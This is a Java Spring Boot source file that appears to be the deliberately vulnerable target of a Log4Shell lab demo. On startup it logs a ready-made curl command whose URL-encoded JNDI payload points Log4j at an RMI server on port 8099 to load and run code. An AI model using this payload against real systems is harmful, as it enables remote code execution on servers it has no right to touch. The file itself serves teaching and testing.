package com.example.log4j2;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class VictimApplication {
    private static final Logger log = LoggerFactory.getLogger(VictimApplication.class);

    public static void main(String[] args) {
        SpringApplication.run(VictimApplication.class, args);
        log.info("Run 'curl http://localhost:8080/hello?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A8099%2Fexec%7D' to exploit.");
    }
}
